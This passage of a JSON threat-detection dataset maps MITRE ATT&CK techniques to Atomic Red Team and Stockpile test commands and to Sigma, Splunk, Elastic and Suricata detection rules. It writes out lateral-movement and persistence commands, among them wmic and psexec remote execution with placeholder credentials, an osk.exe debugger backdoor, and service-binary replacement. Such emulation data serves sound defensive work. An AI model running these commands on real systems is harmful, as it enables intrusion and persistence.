ImagePath:/\\\\$ShellId\\\\[\\\\s*\\\\d{1,3}\\\\s*\\\\]\\\\s*\\\\+\\\\s*\\\\$ShellId\\\\[/ OR ImagePath:/\\\\$env:Public\\\\[\\\\s*\\\\d{1,3}\\\\s*\\\\]\\\\s*\\\\+\\\\s*\\\\$env:Public\\\\[/ OR ImagePath:/\\\\$env:ComSpec\\\\[(\\\\s*\\\\d{1,3}\\\\s*,){2}/ OR ImagePath:/\\\\*mdr\\\\*\\\\W\\\\s*\\\\)\\\\.Name/ OR ImagePath:/\\\\$VerbosePreference\\\\.ToString\\\\(/ OR ImagePath:/\\\\String\\\\]\\\\s*\\\\$VerbosePreference/)\\n(ImagePath:/\\\\$PSHome\\\\[\\\\s*\\\\d{1,3}\\\\s*\\\\]\\\\s*\\\\+\\\\s*\\\\$PSHome\\\\[/ OR ImagePath:/\\\\$ShellId\\\\[\\\\s*\\\\d{1,3}\\\\s*\\\\]\\\\s*\\\\+\\\\s*\\\\$ShellId\\\\[/ OR ImagePath:/\\\\$env:Public\\\\[\\\\s*\\\\d{1,3}\\\\s*\\\\]\\\\s*\\\\+\\\\s*\\\\$env:Public\\\\[/ OR ImagePath:/\\\\$env:ComSpec\\\\[(\\\\s*\\\\d{1,3}\\\\s*,){2}/ OR ImagePath:/\\\\*mdr\\\\*\\\\W\\\\s*\\\\)\\\\.Name/ OR ImagePath:/\\\\$VerbosePreference\\\\.ToString\\\\(/ OR ImagePath:/\\\\String\\\\]\\\\s*\\\\$VerbosePreference/)\\n(ImagePath:/\\\\$PSHome\\\\[\\\\s*\\\\d{1,3}\\\\s*\\\\]\\\\s*\\\\+\\\\s*\\\\$PSHome\\\\[/ OR ImagePath:/\\\\$ShellId\\\\[\\\\s*\\\\d{1,3}\\\\s*\\\\]\\\\s*\\\\+\\\\s*\\\\$ShellId\\\\[/ OR ImagePath:/\\\\$env:Public\\\\[\\\\s*\\\\d{1,3}\\\\s*\\\\]\\\\s*\\\\+\\\\s*\\\\$env:Public\\\\[/ OR ImagePath:/\\\\$env:ComSpec\\\\[(\\\\s*\\\\d{1,3}\\\\s*,){2}/ OR ImagePath:/\\\\*mdr\\\\*\\\\W\\\\s*\\\\)\\\\.Name/ OR ImagePath:/\\\\$VerbosePreference\\\\.ToString\\\\(/ OR ImagePath:/\\\\String\\\\]\\\\s*\\\\$VerbosePreference/)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "title: Ping Hex IP\nid: 1a0d4aba-7668-4365-9ce4-6d79ab088dfd\ndescription: Detects a ping command that uses a hex encoded IP address\nreferences:\n    - https://github.com/vysec/Aggressor-VYSEC/blob/master/ping.cna\n    - https://twitter.com/vysecurity/status/977198418354491392\nauthor: Florian Roth\ndate: 2018/03/23\ntags:\n    - attack.defense_evasion\n    - attack.t1140\n    - attack.t1027\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - '*\\ping.exe 0x*'\n            - '*\\ping 0x*'\n    condition: selection\nfields:\n    - ParentCommandLine\nfalsepositives:\n    - Unlikely, because no sane admin pings IP addresses in a hexadecimal form\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Ping Hex IP\nid: 1a0d4aba-7668-4365-9ce4-6d79ab088dfd\ndescription: Detects a ping command that uses a hex encoded IP address\nreferences:\n    - https://github.com/vysec/Aggressor-VYSEC/blob/master/ping.cna\n    - https://twitter.com/vysecurity/status/977198418354491392\nauthor: Florian Roth\ndate: 2018/03/23\ntags:\n    - attack.defense_evasion\n    - attack.t1140\n    - attack.t1027\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - '*\\ping.exe 0x*'\n            - '*\\ping 0x*'\n    condition: selection\nfields:\n    - ParentCommandLine\nfalsepositives:\n    - Unlikely, because no sane admin pings IP addresses in a hexadecimal form\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "CommandLine.keyword:(*\\\\\\\\ping.exe\\\\ 0x* OR *\\\\\\\\ping\\\\ 0x*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Ping-Hex-IP <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Ping Hex IP\",\\n    \"description\": \"Detects a ping command that uses a hex encoded IP address\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1140\",\\n      \"attack.t1027\"\\n    ],\\n    \"query\": \"CommandLine.keyword:(*\\\\\\\\\\\\\\\\ping.exe\\\\\\\\ 0x* OR *\\\\\\\\\\\\\\\\ping\\\\\\\\ 0x*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"CommandLine.keyword:(*\\\\\\\\\\\\\\\\ping.exe\\\\\\\\ 0x* OR *\\\\\\\\\\\\\\\\ping\\\\\\\\ 0x*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Ping Hex IP\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "CommandLine.keyword:(*\\\\\\\\ping.exe 0x* *\\\\\\\\ping 0x*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(CommandLine=\"*\\\\\\\\ping.exe 0x*\" OR CommandLine=\"*\\\\\\\\ping 0x*\") | table ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine IN [\"*\\\\\\\\ping.exe 0x*\", \"*\\\\\\\\ping 0x*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*.*\\\\ping\\\\.exe 0x.*|.*.*\\\\ping 0x.*)'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "Yml\ntitle: Ping Hex IP\ndescription: win7 simulation test results\nreferences:\n\u00a0\u00a0\u00a0\u00a0- https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_ping_hex_ip.yml\nstatus: experimental\nauthor: 12306Bro\nlogsource:\nproduct: windows\nservice: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0CommandLine:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- '* \\ ping.exe 0x *'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- '* \\ ping 0x *'\n\u00a0\u00a0\u00a0\u00a0condition: selection\nlevel: high", "product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "name": "Yml"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1028/T1028.yaml", "command": "Enable-PSRemoting -Force\n", "name": null}, {"source": "atomics/T1028/T1028.yaml", "command": "powershell.exe [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.application\",\"computer1\")).Documnet.ActiveView.ExecuteShellCommand(\"c:\\windows\\system32\\calc.exe\", $null, $null, \"7\")\n", "name": null}, {"source": "atomics/T1028/T1028.yaml", "command": "wmic /user:#{user_name} /password:P@ssw0rd1 /node:#{computer_name} process call create \"C:\\Windows\\system32\\reg.exe add \\\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\osk.exe\\\" /v \\\"Debugger\\\" /t REG_SZ /d \\\"cmd.exe\\\" /f\"\n", "name": null}, {"source": "atomics/T1028/T1028.yaml", "command": "wmic /user:DOMAIN\\Administrator /password:P@ssw0rd1 /node:#{computer_name} process call create \"C:\\Windows\\system32\\reg.exe add \\\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\osk.exe\\\" /v \\\"Debugger\\\" /t REG_SZ /d \\\"cmd.exe\\\" /f\"\n", "name": null}, {"source": "atomics/T1028/T1028.yaml", "command": "wmic /user:#{user_name} /password:#{password} /node:Target process call create \"C:\\Windows\\system32\\reg.exe add \\\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\osk.exe\\\" /v \\\"Debugger\\\" /t REG_SZ /d \\\"cmd.exe\\\" /f\"\n", "name": null}, {"source": "atomics/T1028/T1028.yaml", "command": "psexec \\\\#{computer_name} -u #{user_name} -p P@ssw0rd1 -s cmd.exe\n", "name": null}, {"source": "atomics/T1028/T1028.yaml", "command": "psexec \\\\#{computer_name} -u DOMAIN\\Administrator -p P@ssw0rd1 -s cmd.exe\n", "name": null}, {"source": "atomics/T1028/T1028.yaml", "command": "psexec \\\\Target -u #{user_name} -p #{password} -s cmd.exe\n", "name": null}, {"source": "atomics/T1028/T1028.yaml", "command": "invoke-command -ComputerName Test -scriptblock {#{remote_command}}\n", "name": null}, {"source": "atomics/T1028/T1028.yaml", "command": "invoke-command -ComputerName Test -scriptblock {ipconfig}\n", "name": null}, {"source": "Threat Hunting Tables", "command": "powershell Enable-PSRemoting -Force", "name": null}, {"source": "SysmonHunter - Windows Remote Management", "command": "winrm.exe", "name": null}], "command_list": ["Enable-PSRemoting -Force\n", "powershell.exe [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.application\",\"computer1\")).Documnet.ActiveView.ExecuteShellCommand(\"c:\\windows\\system32\\calc.exe\", $null, $null, \"7\")\n", "wmic /user:#{user_name} /password:P@ssw0rd1 /node:#{computer_name} process call create \"C:\\Windows\\system32\\reg.exe add \\\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\osk.exe\\\" /v \\\"Debugger\\\" /t REG_SZ /d \\\"cmd.exe\\\" /f\"\n", "wmic /user:DOMAIN\\Administrator /password:P@ssw0rd1 /node:#{computer_name} process call create \"C:\\Windows\\system32\\reg.exe add \\\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\osk.exe\\\" /v \\\"Debugger\\\" /t REG_SZ /d \\\"cmd.exe\\\" /f\"\n", "wmic /user:#{user_name} /password:#{password} /node:Target process call create \"C:\\Windows\\system32\\reg.exe add \\\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\osk.exe\\\" /v \\\"Debugger\\\" /t REG_SZ /d \\\"cmd.exe\\\" /f\"\n", "psexec \\\\#{computer_name} -u #{user_name} -p P@ssw0rd1 -s cmd.exe\n", "psexec \\\\#{computer_name} -u DOMAIN\\Administrator -p P@ssw0rd1 -s cmd.exe\n", "psexec \\\\Target -u #{user_name} -p #{password} -s cmd.exe\n", "invoke-command -ComputerName Test -scriptblock {#{remote_command}}\n", "invoke-command -ComputerName Test -scriptblock {ipconfig}\n", "powershell Enable-PSRemoting -Force", "winrm.exe"], "technique_id": "T1028", "parsed_datasets": [{"Atomic Red Team Test - Windows Remote Management": {"display_name": "Windows Remote Management", "atomic_tests": [{"description": "Powershell Enable WinRM\n", "supported_platforms": ["windows"], "name": "Enable Windows Remote Management", "executor": {"elevation_required": true, "command": "Enable-PSRemoting -Force\n", "name": "powershell"}}, {"description": "Powershell lateral movement using the mmc20 application com object\n\nReference:\n\nhttps://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/\n", "supported_platforms": ["windows"], "name": "PowerShell Lateral Movement", "input_arguments": {"computer_name": {"default": "computer1", "type": "string", "description": "Name of Computer"}}, "executor": {"command": "powershell.exe [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.application\",\"#{computer_name}\")).Documnet.ActiveView.ExecuteShellCommand(\"c:\\windows\\system32\\calc.exe\", $null, $null, \"7\")\n", "name": "command_prompt"}}, {"description": "Utilize WMIC to start remote process\n", "supported_platforms": ["windows"], "name": "WMIC Process Call Create", "input_arguments": {"password": {"default": "P@ssw0rd1", "type": "String", "description": "Password"}, "user_name": {"default": "DOMAIN\\Administrator", "type": "String", "description": "Username"}, "computer_name": {"default": "Target", "type": "String", "description": "Target Computer Name"}}, "executor": {"command": "wmic /user:#{user_name} /password:#{password} /node:#{computer_name} process call create \"C:\\Windows\\system32\\reg.exe add \\\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\osk.exe\\\" /v \\\"Debugger\\\" /t REG_SZ /d \\\"cmd.exe\\\" /f\"\n", "name": "command_prompt"}}, {"description": "Utilize psexec to start remote process\n", "supported_platforms": ["windows"], "name": "Psexec", "input_arguments": {"password": {"default": "P@ssw0rd1", "type": "String", "description": "Password"}, "user_name": {"default": "DOMAIN\\Administrator", "type": "String", "description": "Username"}, "computer_name": {"default": "Target", "type": "String", "description": "Target Computer Name"}}, "executor": {"command": "psexec \\\\#{computer_name} -u #{user_name} -p #{password} -s cmd.exe\n", "name": "command_prompt"}}, {"description": "Execute Invoke-command on remote host\n", "supported_platforms": ["windows"], "name": "Invoke-Command", "input_arguments": {"host_name": {"default": "Test", "type": "String", "description": "Remote Windows Host Name"}, "remote_command": {"default": "ipconfig", "type": "String", "description": "Command to execute on remote Host"}}, "executor": {"command": "invoke-command -ComputerName #{host_name} -scriptblock {#{remote_command}}\n", "name": "powershell"}}], "attack_technique": "T1028"}}, {"Threat Hunting Tables": {"mitre_attack": "T1028", "file_value": "", "file_path": "", "parent_process": "powershell", "itw_sample": "", "chain_id": "100174", "registry_value": "", "mitre_caption": "remote_execution", "registry_path": "", "frequency": "high", "commandline_string": "Enable-PSRemoting -Force", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"SysmonHunter - T1028": {"phase": "Execution, Lateral Movement", "query": [{"process": {"any": {"pattern": "winrm.exe"}}, "type": "process"}], "description": null, "name": "Windows Remote Management", "level": "medium"}}, {"0xtf/nsm-attack": {"Rules": "ET Open", "SID": "2026849", "Verified": "Yes", "Signature": "ET POLICY WinRM wsman Access - Possible Lateral Movement"}}, {"0xtf/nsm-attack": {"Rules": "ET Open", "SID": "2026850", "Verified": "Yes", "Signature": "ET USER_AGENTS WinRM User Agent Detected - Possible Lateral Movement"}}], "queries": [{"query": "Sysmon| where EventID == 1 and (process_path contains \"wsmprovhost.exe\"or process_path contains \"winrm.cmd\")and (process_command_line contains \"Enable-PSRemoting -Force\"or process_command_line contains \"Invoke-Command -computer_name\"or process_command_line contains \"wmic*node*process call create\")", "product": "Azure Sentinel", "name": "Windows Remote Management"}, {"query": "title: Mimikatz through Windows Remote Management\nid: aa35a627-33fb-4d04-a165-d33b4afca3e8\ndescription: Detects usage of mimikatz through WinRM protocol by monitoring access to lsass process by wsmprovhost.exe.\nreferences:\n    - https://pentestlab.blog/2018/05/15/lateral-movement-winrm/\nstatus: stable\nauthor: Patryk Prauze - ING Tech\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 10\n        TargetImage: 'C:\\windows\\system32\\lsass.exe'\n        SourceImage: 'C:\\Windows\\system32\\wsmprovhost.exe'\n    condition: selection\ntags:\n    - attack.credential_access\n    - attack.execution\n    - attack.t1003\n    - attack.t1028\n    - attack.s0005\nfalsepositives:\n    - low\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Mimikatz through Windows Remote Management\nid: aa35a627-33fb-4d04-a165-d33b4afca3e8\ndescription: Detects usage of mimikatz through WinRM protocol by monitoring access to lsass process by wsmprovhost.exe.\nreferences:\n    - https://pentestlab.blog/2018/05/15/lateral-movement-winrm/\nstatus: stable\nauthor: Patryk Prauze - ING Tech\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 10\n        TargetImage: 'C:\\windows\\system32\\lsass.exe'\n        SourceImage: 'C:\\Windows\\system32\\wsmprovhost.exe'\n    condition: selection\ntags:\n    - attack.credential_access\n    - attack.execution\n    - attack.t1003\n    - attack.t1028\n    - attack.s0005\nfalsepositives:\n    - low\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"10\" AND TargetImage:\"C\\\\:\\\\\\\\windows\\\\\\\\system32\\\\\\\\lsass.exe\" AND SourceImage:\"C\\\\:\\\\\\\\Windows\\\\\\\\system32\\\\\\\\wsmprovhost.exe\")", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Mimikatz-through-Windows-Remote-Management <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Mimikatz through Windows Remote Management\",\\n    \"description\": \"Detects usage of mimikatz through WinRM protocol by monitoring access to lsass process by wsmprovhost.exe.\",\\n    \"tags\": [\\n      \"attack.credential_access\",\\n      \"attack.execution\",\\n      \"attack.t1003\",\\n      \"attack.t1028\",\\n      \"attack.s0005\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"10\\\\\" AND TargetImage:\\\\\"C\\\\\\\\:\\\\\\\\\\\\\\\\windows\\\\\\\\\\\\\\\\system32\\\\\\\\\\\\\\\\lsass.exe\\\\\" AND SourceImage:\\\\\"C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\system32\\\\\\\\\\\\\\\\wsmprovhost.exe\\\\\")\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"10\\\\\" AND TargetImage:\\\\\"C\\\\\\\\:\\\\\\\\\\\\\\\\windows\\\\\\\\\\\\\\\\system32\\\\\\\\\\\\\\\\lsass.exe\\\\\" AND SourceImage:\\\\\"C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\system32\\\\\\\\\\\\\\\\wsmprovhost.exe\\\\\")\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Mimikatz through Windows Remote Management\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"10\" AND TargetImage:\"C\\\\:\\\\\\\\windows\\\\\\\\system32\\\\\\\\lsass.exe\" AND SourceImage:\"C\\\\:\\\\\\\\Windows\\\\\\\\system32\\\\\\\\wsmprovhost.exe\")", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"10\" TargetImage=\"C:\\\\\\\\windows\\\\\\\\system32\\\\\\\\lsass.exe\" SourceImage=\"C:\\\\\\\\Windows\\\\\\\\system32\\\\\\\\wsmprovhost.exe\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"10\" TargetImage=\"C:\\\\\\\\windows\\\\\\\\system32\\\\\\\\lsass.exe\" SourceImage=\"C:\\\\\\\\Windows\\\\\\\\system32\\\\\\\\wsmprovhost.exe\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*10)(?=.*C:\\\\windows\\\\system32\\\\lsass\\\\.exe)(?=.*C:\\\\Windows\\\\system32\\\\wsmprovhost\\\\.exe))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "Yml\ntitle: win_ remote powershell session\ndescription: windows server 2016\ntags: T1028\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ dllhost.exe' # new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ Windows \\ System32 \\ svchost.exe' # creator process name\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ wsmprovhost.exe' # New Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ Windows \\ System32 \\ svchost.exe' # creator process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: 'C: \\ Windows \\ system32 \\ wsmprovhost.exe -Embedding' # process command line arguments\n\u00a0\u00a0\u00a0\u00a0timeframe: last 2s\n\u00a0\u00a0\u00a0\u00a0condition: selection\nlevel: medium", "product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "name": "Yml"}, {"query": "ET POLICY WinRM wsman Access - Possible Lateral Movement", "product": "Suricata (NSM)", "name": "ET Open Rule"}, {"query": "ET USER_AGENTS WinRM User Agent Detected - Possible Lateral Movement", "product": "Suricata (NSM)", "name": "ET Open Rule"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1030/T1030.yaml", "command": "cd /tmp/\ndd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1\nsplit -b 5000000 /tmp/victim-whole-file\nls -l\n", "name": null}], "command_list": ["cd /tmp/\ndd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1\nsplit -b 5000000 /tmp/victim-whole-file\nls -l\n"], "technique_id": "T1030", "parsed_datasets": [{"Atomic Red Team Test - Data Transfer Size Limits": {"display_name": "Data Transfer Size Limits", "atomic_tests": [{"description": "Take a file/directory, split it into 5Mb chunks\n", "supported_platforms": ["macos", "linux"], "name": "Data Transfer Size Limits", "executor": {"elevation_required": false, "command": "cd /tmp/\ndd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1\nsplit -b 5000000 /tmp/victim-whole-file\nls -l\n", "name": "sh"}}], "attack_technique": "T1030"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1031/T1031.yaml", "command": "sc config Fax binPath= \"C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -noexit -c \\\"write-host 'T1031 Test'\\\"\"\nsc start Fax\n", "name": null}, {"source": "data/abilities/persistence/52771610-2322-44cf-816b-a7df42b4c086.yml", "command": {"windows": {"psh": {"cleanup": "$exe = (Get-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Services\\#{host.service.modifiable}\").ImagePath.split()[0];\n$path = (Resolve-Path $exe).Path;\nIf (Test-Path ($path + \".saved\")) {\n  Remove-Item $path;\n  Move-Item -Path ($path + \".saved\") -Destination $path\n}\n", "command": "$s = Get-Service -Name #{host.service.modifiable};\nif ($s.status -ne 'Stopped') { Stop-Service $s };\n$exe = (Get-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Services\\#{host.service.modifiable}\").ImagePath.split()[0];\n$path = (Resolve-Path $exe).Path;\nCopy-Item -Path $path -Destination ($path + \".saved\");\nCopy-Item -Path \"C:\\Windows\\System32\\snmptrap.exe\" -Destination $path\n"}}}, "name": "This is an example technique. snmptrap.exe should be changed in the command\nbelow with the new desired service binary. Depending on the value of\nhost.service.modifiable this ability can damage the target system.\n"}, {"source": "Threat Hunting Tables", "command": "sc.exe", "name": "parent_process"}], "command_list": ["sc config Fax binPath= \"C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -noexit -c \\\"write-host 'T1031 Test'\\\"\"\nsc start Fax\n", {"windows": {"psh": {"cleanup": "$exe = (Get-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Services\\#{host.service.modifiable}\").ImagePath.split()[0];\n$path = (Resolve-Path $exe).Path;\nIf (Test-Path ($path + \".saved\")) {\n  Remove-Item $path;\n  Move-Item -Path ($path + \".saved\") -Destination $path\n}\n", "command": "$s = Get-Service -Name #{host.service.modifiable};\nif ($s.status -ne 'Stopped') { Stop-Service $s };\n$exe = (Get-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Services\\#{host.service.modifiable}\").ImagePath.split()[0];\n$path = (Resolve-Path $exe).Path;\nCopy-Item -Path $path -Destination ($path + \".saved\");\nCopy-Item -Path \"C:\\Windows\\System32\\snmptrap.exe\" -Destination $path\n"}}}, "sc.exe"], "technique_id": "T1031", "parsed_datasets": [{"Atomic Red Team Test - Modify Existing Service": {"display_name": "Modify Existing Service", "atomic_tests": [{"description": "This test will temporarily modify the service Fax by changing the binPath to PowerShell\nand will then revert the binPath change, restoring Fax to its original state.\n", "supported_platforms": ["windows"], "name": "Modify Fax service to run PowerShell", "executor": {"elevation_required": true, "command": "sc config Fax binPath= \"C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -noexit -c \\\"write-host 'T1031 Test'\\\"\"\nsc start Fax\n", "name": "command_prompt", "cleanup_command": "sc config Fax binPath= \"C:\\WINDOWS\\system32\\fxssvc.exe\""}}], "attack_technique": "T1031"}}, {"Mitre Stockpile - This is an example technique. snmptrap.exe should be changed in the command\nbelow with the new desired service binary. Depending on the value of\nhost.service.modifiable this ability can damage the target system.\n": {"platforms": {"windows": {"psh": {"cleanup": "$exe = (Get-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Services\\#{host.service.modifiable}\").ImagePath.split()[0];\n$path = (Resolve-Path $exe).Path;\nIf (Test-Path ($path + \".saved\")) {\n  Remove-Item $path;\n  Move-Item -Path ($path + \".saved\") -Destination $path\n}\n", "command": "$s = Get-Service -Name #{host.service.modifiable};\nif ($s.status -ne 'Stopped') { Stop-Service $s };\n$exe = (Get-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Services\\#{host.service.modifiable}\").ImagePath.split()[0];\n$path = (Resolve-Path $exe).Path;\nCopy-Item -Path $path -Destination ($path + \".saved\");\nCopy-Item -Path \"C:\\Windows\\System32\\snmptrap.exe\" -Destination $path\n"}}}, "requirements": [{"plugins.stockpile.app.requirements.paw_provenance": [{"source": "host.service.modifiable"}]}], "description": "This is an example technique. snmptrap.exe should be changed in the command\nbelow with the new desired service binary. Depending on the value of\nhost.service.modifiable this ability can damage the target system.\n", "tactic": "persistence", "technique": {"attack_id": "T1031", "name": "Modify Existing Service"}, "id": "52771610-2322-44cf-816b-a7df42b4c086", "name": "Replace a service binary with alternate binary"}}, {"Threat Hunting Tables": {"mitre_attack": "T1031", "file_value": "", "file_path": "", "parent_process": "sc.exe", "itw_sample": "", "chain_id": "100073", "registry_value": "", "mitre_caption": "sc", "registry_path": "", "frequency": "high", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}], "queries": [{"query": "Sysmon| where EventID == 1 and (process_path contains \"sc.exe\"or process_path contains \"powershell.exe\"or process_path contains \"cmd.exe\")and process_command_line contains \"*sc*config*binpath*\"", "product": "Azure Sentinel", "name": "Modify Existing Service"}, {"query": "title: Suspicious service path modification\nid: 138d3531-8793-4f50-a2cd-f291b2863d78\ndescription: Detects service path modification to powershell/cmd\nstatus: experimental\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1031/T1031.yaml\ntags:\n    - attack.persistence\n    - attack.t1031\ndate: 2019/10/21\nmodified: 2019/11/10\nauthor: Victor Sergeev, oscd.community\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n        Image|endswith: '\\sc.exe'\n        CommandLine|contains|all:\n            - 'config'\n            - 'binpath'\n    selection_2:\n        CommandLine|contains:\n            - 'powershell'\n            - 'cmd'\n    condition: selection_1 and selection_2\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - 